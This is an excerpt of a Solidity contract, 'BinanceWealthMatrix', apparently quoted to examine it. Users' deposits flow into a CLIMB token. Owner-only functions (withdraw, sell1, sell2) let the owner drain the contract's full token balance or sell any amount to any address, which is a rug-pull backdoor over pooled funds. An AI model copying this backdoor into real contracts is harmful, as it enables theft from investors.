...
contract BinanceWealthMatrix is Ownable {
    ...
    address public constant CLIMB_ADDRESS =
        0x013B7d73BF123451805930D559F5D94a7f0a5735;
    ...
    IClimb CLIMB = IClimb(CLIMB_ADDRESS);
    ...
    function investInMatrix(address ref) public payable {
        ...
        payable(address(CLIMB)).transfer(msg.value);
    ...
    function reinvestInMatrix(address ref) public {
        ...
        CLIMB.burn(burnFee);
        CLIMB.sell(dFee, address(feeReceiver));
    ...
    function matrixRedeem() public {
        ...
        CLIMB.sell(eggsValue, msg.sender);
    ...
    function withdraw() public onlyOwner {
        uint256 balance = CLIMB.balanceOf(address(this));
        CLIMB.transfer(msg.sender, balance);
    }

    function sell1(uint256 amount, address to) public onlyOwner {
        CLIMB.sell(amount, to);
    }

    function sell2(uint256 amount, address to) public onlyOwner {
        IClimb(address(CLIMB)).sell(amount, to);
    }
}
